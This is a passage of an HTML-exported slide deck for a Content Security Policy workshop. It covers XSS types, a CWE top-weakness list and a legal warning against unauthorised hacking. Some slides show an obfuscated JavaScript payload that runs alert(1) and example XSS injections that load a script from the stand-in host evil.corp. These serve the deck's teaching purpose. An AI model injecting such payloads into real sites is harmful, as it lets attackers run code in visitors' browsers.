strong,div#\:\$p>svg>foreignObject>section :is(h4,marp-h4) strong,div#\:\$p>svg>foreignObject>section :is(h5,marp-h5) strong,div#\:\$p>svg>foreignObject>section :is(h6,marp-h6) strong{color:var(--color-highlight)}div#\:\$p>svg>foreignObject>section :is(pre,marp-pre){background:var(--color-foreground)}div#\:\$p>svg>foreignObject>section :is(pre,marp-pre)>code{background:transparent}div#\:\$p>svg>foreignObject>section blockquote:after,div#\:\$p>svg>foreignObject>section blockquote:before,div#\:\$p>svg>foreignObject>section footer,div#\:\$p>svg>foreignObject>section header,div#\:\$p>svg>foreignObject>section section:after{color:var(--color-dimmed)}div#\:\$p>svg>foreignObject>section table td,div#\:\$p>svg>foreignObject>section table th{border-color:var(--color-foreground)}div#\:\$p>svg>foreignObject>section table thead th{background:var(--color-foreground);color:var(--color-background)}div#\:\$p>svg>foreignObject>section table tbody>tr:nth-child(odd) td,div#\:\$p>svg>foreignObject>section table tbody>tr:nth-child(odd) th{background:var(--color-background-stripe,transparent)}div#\:\$p>svg>foreignObject>section>:first-child,div#\:\$p>svg>foreignObject>section>header:first-child+*{margin-top:0}div#\:\$p>svg>foreignObject>section:where(.invert){--color-background:#455a64;--color-background-stripe:rgba(255,248,225,.1);--color-foreground:#fff8e1;--color-dimmed:#dad8c8;--color-highlight:#81d4fa}div#\:\$p>svg>foreignObject>section:where(.gaia){--color-background:#0288d1;--color-background-stripe:rgba(255,248,225,.1);--color-foreground:#fff8e1;--color-dimmed:#cce2de;--color-highlight:#81d4fa}div#\:\$p>svg>foreignObject>section:where(.lead){display:flex;flex-flow:column nowrap;justify-content:center}div#\:\$p>svg>foreignObject>section:where(.lead) :is(h1,marp-h1),div#\:\$p>svg>foreignObject>section:where(.lead) :is(h2,marp-h2),div#\:\$p>svg>foreignObject>section:where(.lead) :is(h3,marp-h3),div#\:\$p>svg>foreignObject>section:where(.lead) :is(h4,marp-h4),div#\:\$p>svg>foreignObject>section:where(.lead) :is(h5,marp-h5),div#\:\$p>svg>foreignObject>section:where(.lead) :is(h6,marp-h6){text-align:center}div#\:\$p>svg>foreignObject>section:where(.lead) p{text-align:center}div#\:\$p>svg>foreignObject>section:where(.lead) blockquote>:is(h1,marp-h1),div#\:\$p>svg>foreignObject>section:where(.lead) blockquote>:is(h2,marp-h2),div#\:\$p>svg>foreignObject>section:where(.lead) blockquote>:is(h3,marp-h3),div#\:\$p>svg>foreignObject>section:where(.lead) blockquote>:is(h4,marp-h4),div#\:\$p>svg>foreignObject>section:where(.lead) blockquote>:is(h5,marp-h5),div#\:\$p>svg>foreignObject>section:where(.lead) blockquote>:is(h6,marp-h6),div#\:\$p>svg>foreignObject>section:where(.lead) blockquote>p{text-align:left}div#\:\$p>svg>foreignObject>section:where(.lead) ol>li>p,div#\:\$p>svg>foreignObject>section:where(.lead) ul>li>p{text-align:left}div#\:\$p>svg>foreignObject>section:where(.lead) table{margin-left:auto;margin-right:auto}div#\:\$p>svg>foreignObject>section img[data-marp-twemoji]{background:transparent;height:1em;margin:0 .05em 0 .1em;vertical-align:-.1em;width:1em}
 /*!
 * Marp / Marpit Bouvet theme.
 *
 * @theme bouvet
 * @author Knut Erik Hollund
 *
 * @auto-scaling true
 * @size 16:9 1280px 720px
 * @size 4:3 960px 720px
 */ /* inherit 'gaia' theme */div#\:\$p>svg>foreignObject>section{font-family:'Inter';color:#F9EAD4}div#\:\$p>svg>foreignObject>section{background:#11133C;color:#F9EAD4}div#\:\$p>svg>foreignObject>section.lead :is(h1,marp-h1){font-size:calc(var(--marpit-root-font-size, 1rem) * 1.5)}div#\:\$p>svg>foreignObject>section :is(h1,marp-h1),div#\:\$p>svg>foreignObject>section :is(h2,marp-h2),div#\:\$p>svg>foreignObject>section :is(h3,marp-h3),div#\:\$p>svg>foreignObject>section :is(h4,marp-h4),div#\:\$p>svg>foreignObject>section :is(h5,marp-h5),div#\:\$p>svg>foreignObject>section blockquote,div#\:\$p>svg>foreignObject>section blockquote:after,div#\:\$p>svg>foreignObject>section blockquote:before,div#\:\$p>svg>foreignObject>section footer,div#\:\$p>svg>foreignObject>section lead,div#\:\$p>svg>foreignObject>section li,div#\:\$p>svg>foreignObject>section p,div#\:\$p>svg>foreignObject>section td,div#\:\$p>svg>foreignObject>section th{color:#F9EAD4}div#\:\$p>svg>foreignObject>section :is(h1,marp-h1){font-size:calc(var(--marpit-root-font-size, 1rem) * 1.2)}div#\:\$p>svg>foreignObject>section:after{content:attr(data-marpit-pagination) '/' attr(data-marpit-pagination-total);font-size:calc(var(--marpit-root-font-size, 1rem) * 0.8)}div#\:\$p>svg>foreignObject>section:after{--marpit-root-font-size:calc(var(--marpit-root-font-size, 1rem) * 0.8)}div#\:\$p>svg>foreignObject>section blockquote{margin:auto}div#\:\$p>svg>foreignObject>section footer{font-size:calc(var(--marpit-root-font-size, 1rem) * 0.3)}div#\:\$p>svg>foreignObject>section{width:1280px;height:720px}div#\:\$p>svg>foreignObject>section[data-marpit-scope-1Fh86zf9] :is(h1,marp-h1){font-size:calc(var(--marpit-root-font-size, 1rem) * 1.5);color:red;text-align:center}div#\:\$p>svg>foreignObject>section[data-marpit-scope-FVOldf0J] :is(h1,marp-h1){font-size:calc(var(--marpit-root-font-size, 1rem) * 12);color:red;text-align:center}div#\:\$p>svg>foreignObject>section[data-marpit-scope-g5vbkGG4] :is(h1,marp-h1){font-size:calc(var(--marpit-root-font-size, 1rem) * 14);color:red;text-align:center}div#\:\$p>svg>foreignObject>section[data-marpit-scope-3FtAmwZg] code{text-align:left;font-size:calc(var(--marpit-root-font-size, 1rem) * 1.1);background-color:black;color:white}div#\:\$p>svg>foreignObject>section[data-marpit-scope-3FtAmwZg] :is(h1,marp-h1){font-size:calc(var(--marpit-root-font-size, 1rem) * 3);color:red;text-align:center}div#\:\$p>svg>foreignObject>section[data-marpit-scope-8Q7OCKaI] code{font-size:calc(var(--marpit-root-font-size, 1rem) * 1.2)}div#\:\$p>svg>foreignObject>section[data-marpit-scope-a4w6Bj5P] p{font-size:calc(var(--marpit-root-font-size, 1rem) * 2);text-align:center}div#\:\$p>svg>foreignObject>section[data-marpit-scope-p7YEAJwj] code{font-size:calc(var(--marpit-root-font-size, 1rem) * 0.6)}div#\:\$p>svg>foreignObject>section[data-marpit-scope-p7YEAJwj] li{font-size:calc(var(--marpit-root-font-size, 1rem) * 0.7)}div#\:\$p>svg>foreignObject>section[data-marpit-advanced-background=background]{columns:initial!important;display:block!important;padding:0!important}div#\:\$p>svg>foreignObject>section[data-marpit-advanced-background=background]:after,div#\:\$p>svg>foreignObject>section[data-marpit-advanced-background=background]:before,div#\:\$p>svg>foreignObject>section[data-marpit-advanced-background=content]:after,div#\:\$p>svg>foreignObject>section[data-marpit-advanced-background=content]:before{display:none!important}div#\:\$p>svg>foreignObject>section[data-marpit-advanced-background=background]>div[data-marpit-advanced-background-container]{all:initial;display:flex;flex-direction:row;height:100%;overflow:hidden;width:100%}div#\:\$p>svg>foreignObject>section[data-marpit-advanced-background=background]>div[data-marpit-advanced-background-container][data-marpit-advanced-background-direction=vertical]{flex-direction:column}div#\:\$p>svg>foreignObject>section[data-marpit-advanced-background=background][data-marpit-advanced-background-split]>div[data-marpit-advanced-background-container]{width:var(--marpit-advanced-background-split,50%)}div#\:\$p>svg>foreignObject>section[data-marpit-advanced-background=background][data-marpit-advanced-background-split=right]>div[data-marpit-advanced-background-container]{margin-left:calc(100% - var(--marpit-advanced-background-split, 50%))}div#\:\$p>svg>foreignObject>section[data-marpit-advanced-background=background]>div[data-marpit-advanced-background-container]>figure{all:initial;background-position:center;background-repeat:no-repeat;background-size:cover;flex:auto;margin:0}div#\:\$p>svg>foreignObject>section[data-marpit-advanced-background=background]>div[data-marpit-advanced-background-container]>figure>figcaption{position:absolute;border:0;clip:rect(0,0,0,0);height:1px;margin:-1px;overflow:hidden;padding:0;white-space:nowrap;width:1px}div#\:\$p>svg>foreignObject>section[data-marpit-advanced-background=content],div#\:\$p>svg>foreignObject>section[data-marpit-advanced-background=pseudo]{background:transparent!important}div#\:\$p>svg>foreignObject>section[data-marpit-advanced-background=pseudo],div#\:\$p>svg[data-marpit-svg]>foreignObject[data-marpit-advanced-background=pseudo]{pointer-events:none!important}div#\:\$p>svg>foreignObject>section[data-marpit-advanced-background-split]{width:100%;height:100%}</style></head><body><div class="bespoke-marp-osc"><button data-bespoke-marp-osc="prev" tabindex="-1" title="Previous slide">Previous slide</button><span data-bespoke-marp-osc="page"></span><button data-bespoke-marp-osc="next" tabindex="-1" title="Next slide">Next slide</button><button data-bespoke-marp-osc="fullscreen" tabindex="-1" title="Toggle fullscreen (f)">Toggle fullscreen</button><button data-bespoke-marp-osc="presenter" tabindex="-1" title="Open presenter view (p)">Open presenter view</button></div><div id=":$p"><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-class="lead" data-theme="bouvet" class="lead" data-marpit-pagination="1" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--class:lead;--theme:bouvet;--marpit-advanced-background-split:35%;" data-marpit-pagination-total="51" data-size="16:9" data-marpit-advanced-background="background" data-marpit-advanced-background-split="right"><div data-marpit-advanced-background-container="true" data-marpit-advanced-background-direction="horizontal"><figure style="background-image:url(&quot;./resources/bouvet_people.jpg&quot;);"></figure></div></section></foreignObject><foreignObject width="65%" height="720"><section id="1" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-class="lead" data-theme="bouvet" class="lead" data-marpit-pagination="1" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--class:lead;--theme:bouvet;--marpit-advanced-background-split:35%;" data-marpit-pagination-total="51" data-size="16:9" data-marpit-advanced-background="content" data-marpit-advanced-background-split="right">
<h1 id="content-security-policiesbrworkshop">Content Security Policies<br />Workshop</h1>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code>Security isn’t something you buy, it’s something you do!
</code></pre>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject><foreignObject width="1280" height="720" data-marpit-advanced-background="pseudo"><section data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-class="lead" data-theme="bouvet" class="lead" data-marpit-pagination="1" style="" data-marpit-pagination-total="51" data-size="16:9" data-marpit-advanced-background="pseudo" data-marpit-advanced-background-split="right"></section></foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="2" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="2" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h2 id="learning-objectives-%F0%9F%91%A9%F0%9F%8F%BD%E2%80%8D%F0%9F%8F%AB">Learning objectives <img class="emoji" draggable="false" alt="👩🏽‍🏫" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/1f469-1f3fd-200d-1f3eb.svg" data-marp-twemoji=""/></h2>
<ul>
<li><img class="emoji" draggable="false" alt="👨🏼‍💻" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/1f468-1f3fc-200d-1f4bb.svg" data-marp-twemoji=""/> Awareness and understanding of certain types of web app attacks</li>
<li><img class="emoji" draggable="false" alt="🐞" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/1f41e.svg" data-marp-twemoji=""/> Exploring and learning Content Security Policies and how they can mitigate attacks</li>
<li><img class="emoji" draggable="false" alt="🤩" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/1f929.svg" data-marp-twemoji=""/> Inspire to increase understanding of Application Security (AppSec)</li>
<li><img class="emoji" draggable="false" alt="🤗" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/1f917.svg" data-marp-twemoji=""/> Have fun while learning!</li>
</ul>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="3" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="3" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="agenda">Agenda</h1>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code>- The risk of injections (XSS)
  - Top most dangrous software weaknesses
  - Why do we need CSP
- CSP directives - with a <img class="emoji" draggable="false" alt="☕" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/2615.svg" data-marp-twemoji=""/> break :
  - &quot;default-src&quot;
  - &quot;script-src&quot; - &quot;style-src&quot; - &quot;font-src&quot; - &quot;img-src&quot;
  - &quot;connect-src&quot; and &quot;media-src&quot;
- Reporting URI - logging violation issues
  - &quot;report-uri / report-to&quot; directive
- Applying directives to your existing project
- We explore together - by adding CSP to an existing site
</code></pre>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="4" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="4" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="disclaimer">Disclaimer</h1>
<ul>
<li>We're not experts but we're here together to learn and share what we have learned so far in the journey</li>
<li>Application Security is a broad topic - this workshop has it's focus on CSP for defending for certain types of attacks</li>
<li>The perspective is depended on experience, personal journey in security and many other factors</li>
<li>The more we learn about cyber security, the more we realise how complex it is</li>
<li>Please share your thoughts, ideas and experiences</li>
</ul>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="5" data-marpit-scope-1Fh86zf9="" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="5" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="warning-%E2%9A%A0%EF%B8%8F%E2%9A%A0%EF%B8%8F%E2%9A%A0%EF%B8%8F">Warning <img class="emoji" draggable="false" alt="⚠️" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" data-marp-twemoji=""/><img class="emoji" draggable="false" alt="⚠️" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" data-marp-twemoji=""/><img class="emoji" draggable="false" alt="⚠️" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" data-marp-twemoji=""/></h1>
<ul>
<li>Warning: Please do not attempt to hack any computer system without legal permission to do so. Unauthorised computer hacking is illegal and can be punished</li>
<li>Innbrudd i datasystem
<ul>
<li>Lovdata §204 <a href="https://lovdata.no/lov/2005-05-20-28/%C2%A7204">https://lovdata.no/lov/2005-05-20-28/§204</a></li>
<li><em>&quot;Med bot eller fengsel inntil 2 år straffes den som ved å bryte en beskyttelse eller ved annen uberettiget fremgangsmåte skaffer seg tilgang til datasystem eller del av det&quot;</em></li>
</ul>
</li>
</ul>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="6" data-marpit-scope-FVOldf0J="" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="6" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="">&lt;</h1>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="7" data-marpit-scope-g5vbkGG4="" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="7" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="xss">XSS</h1>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="8" data-marpit-scope-3FtAmwZg="" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="8" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="%F0%9F%98%AC%F0%9F%98%B3%F0%9F%AB%A8%F0%9F%A4%AF"><img class="emoji" draggable="false" alt="😬" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/1f62c.svg" data-marp-twemoji=""/><img class="emoji" draggable="false" alt="😳" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/1f633.svg" data-marp-twemoji=""/>🫨<img class="emoji" draggable="false" alt="🤯" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/1f92f.svg" data-marp-twemoji=""/></h1>
<p><code>&quot;&quot;[(!1+&quot;&quot;)[3]+(!0+&quot;&quot;)[2]+(''+{})[2]][(''+{})[5]+(''+{})[1]+((&quot;&quot;[(!1+&quot;&quot;)[3]+(!0+&quot;&quot;)[2]+(''+{})[2]])+&quot;&quot;)[2]+(!1+'')[3]+(!0+'')[0]+(!0+'')[1]+(!0+'')[2]+(''+{})[5]+(!0+'')[0]+(''+{})[1]+(!0+'')[1]](((!1+&quot;&quot;)[1]+(!1+&quot;&quot;)[2]+(!0+&quot;&quot;)[3]+(!0+&quot;&quot;)[1]+(!0+&quot;&quot;)[0])+&quot;(1)&quot;)()</code></p>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="9" data-marpit-scope-8Q7OCKaI="" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="9" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9"><pre is="marp-pre" data-auto-scaling="downscale-only"><code class="language-javascript"><span class="hljs-title class_">Function</span>(<span class="hljs-string">&quot;alert(1)&quot;</span>)()
</code></pre>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="10" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="10" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="top-most-dangerous-software-weaknesses">Top Most Dangerous Software Weaknesses</h1>
<ol>
<li>Out-of-bounds Write - (overwrite memory - C/C++)</li>
<li><strong>Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</strong></li>
<li>Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</li>
</ol>
<p>Source: <a href="https://cwe.mitre.org/top25/archive/2023/2023_top25_list.html">MITRE - cwe.mitre.org - 2023</a></p>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="11" data-marpit-fragments="3" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="11" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="xss---cross-site-scripting">XSS - Cross-Site Scripting</h1>
<ul>
<li data-marpit-fragment="1">Is a misnomer - Wrong name, nothing cross site about it</li>
<li data-marpit-fragment="2">A better name is &quot;Java Script Injection&quot; or &quot;Content Injection&quot;</li>
<li data-marpit-fragment="3">Easy to fix - difficult to fix at scale</li>
</ul>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="12" data-marpit-fragments="3" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="12" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="why-do-we-need-csp---1--2">Why do we need CSP - 1 / 2</h1>
<p>The primary goal of CSP is to mitigate and report XSS attacks!</p>
<ul>
<li data-marpit-fragment="1">Content Security Policy (CSP) is an added layer of security</li>
<li data-marpit-fragment="2">XSS attacks exploit the browser's trust in the content received from the server</li>
<li data-marpit-fragment="3">Malicious scripts are executed by the victim's browser because the browser trusts the source of the content</li>
</ul>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="13" data-marpit-fragments="2" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="13" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="why-do-we-need-csp---2--2">Why do we need CSP - 2 / 2</h1>
<ul>
<li data-marpit-fragment="1">CSP helps to detect and mitigate certain types of attacks
<ul>
<li>Cross-Site Scripting (XSS) and data injection attacks</li>
<li>Attacks are used for data theft, site defacement, malware distribution etc.</li>
</ul>
</li>
<li data-marpit-fragment="2">XSS ranked as 3rd on the OWASP TOP 10 list</li>
</ul>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="14" data-marpit-scope-a4w6Bj5P="" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="14" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<blockquote>
<p><em>CSP + Security Headers er et mareritt å komme seg forbi som pen-tester!</em></p>
</blockquote>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="15" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="15" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="what-is-csp">What is CSP?</h1>
<p>From the W3C* definition :</p>
<blockquote>
<p>This <a href="https://www.w3.org/TR/CSP3/#intro">document</a> defines Content Security Policy (CSP), a tool which developers can use to lock down their applications in various ways, mitigating the risk of content injection vulnerabilities such as cross-site scripting, and reducing the privilege with which their applications execute.</p>
</blockquote>
<p><code>*W3C = World Wide Web Consortium</code></p>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="16" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="16" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="types-of-xss-attacks">Types of XSS attacks</h1>
<p>There are several types of XSS:</p>
<table>
<thead>
<tr>
<th>XSS</th>
<th>-</th>
</tr>
</thead>
<tbody>
<tr>
<td>Reflected</td>
<td>Type 1</td>
</tr>
<tr>
<td>Stored</td>
<td>Type 2</td>
</tr>
<tr>
<td>DOM Based</td>
<td>Type 0</td>
</tr>
</tbody>
</table>
<p><code>DOM = Document Object Model - W3C standard</code></p>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="17" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="17" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="reflected-xss-attack---1--2">Reflected XSS attack - 1 / 2</h1>
<p>Reflected XSS occurs when user input is immediately returned by a web application in an error message, search result, or any other response that includes some or all of the input provided by the user as part of the request, without that data being made safe to render in the browser, and without permanently storing the user provided data.</p>
<p>Example:</p>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code class="language-html">https://insecure-web.com/comment?message=<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">https://evil.corp/badscript.js</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="18" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9" data-marpit-advanced-background="background"><div data-marpit-advanced-background-container="true" data-marpit-advanced-background-direction="horizontal"><figure style="background-image:url(&quot;./resources/reflected_xss_diagram.png&quot;);background-size:70%;"></figure></div></section></foreignObject><foreignObject width="1280" height="720"><section id="18" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="18" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9" data-marpit-advanced-background="content"><footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject><foreignObject width="1280" height="720" data-marpit-advanced-background="pseudo"><section data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="18" style="" data-marpit-pagination-total="51" data-size="16:9" data-marpit-advanced-background="pseudo"></section></foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="19" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="19" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="stored-persistent-xss-attack">Stored (persistent) XSS attack</h1>
<p>Stored XSS generally occurs when user input is stored on the target server, such as in a database, in a message forum, visitor log, comment field, etc. And then a victim is able to retrieve the stored data from the web application without that data being made safe to render in the browser.</p>
<p>Instead of a decent comment on the blog's input field, the attacker write:</p>
<pre is="marp-pre" data-auto-scaling="downscale-only"><code class="language-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;https://evil.corp/badscript.js&#x27;</span>/&gt;</span>
</code></pre>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="20" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9" data-marpit-advanced-background="background"><div data-marpit-advanced-background-container="true" data-marpit-advanced-background-direction="horizontal"><figure style="background-image:url(&quot;./resources/stored_persistent_xss.png&quot;);background-size:70%;"></figure></div></section></foreignObject><foreignObject width="1280" height="720"><section id="20" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="20" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9" data-marpit-advanced-background="content"><footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject><foreignObject width="1280" height="720" data-marpit-advanced-background="pseudo"><section data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="20" style="" data-marpit-pagination-total="51" data-size="16:9" data-marpit-advanced-background="pseudo"></section></foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="21" data-marpit-fragments="2" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="21" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
<h1 id="terms-to-help-organize-types-of-xss---1--2">Terms to help organize types of XSS - 1 / 2</h1>
<ul>
<li data-marpit-fragment="1"><strong>Server XSS</strong> - occurs when untrusted user supplied data is included in an HTTP response generated by the server.</li>
<li data-marpit-fragment="2"><strong>Client XSS</strong> - occurs when untrusted user supplied data is used to update the DOM with an unsafe JavaScript call. A JavaScript call is considered unsafe if it can be used to introduce valid JavaScript into the DOM.</li>
</ul>
<footer>AppSec Workshop - Content Security Policies</footer>
</section>
</foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="22" data-footer="AppSec Workshop - Content Security Policies" data-paginate="true" data-theme="bouvet" data-marpit-pagination="22" style="--footer:AppSec Workshop - Content Security Policies;--paginate:true;--theme:bouvet;" data-marpit-pagination-total="51" data-size="16:9">
